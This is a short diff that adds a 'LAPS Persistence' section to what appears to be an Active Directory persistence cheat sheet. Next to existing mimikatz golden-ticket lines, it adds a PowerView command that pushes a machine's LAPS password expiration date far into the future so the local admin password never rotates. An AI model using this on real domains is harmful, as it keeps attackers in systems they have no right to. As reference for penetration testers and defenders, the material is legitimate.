@@ -588,6 +588,14 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 kerberos::tgt
 ```
 
+### LAPS Persistence
+
+To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.
+
+```ps1
+Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
+```
+
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
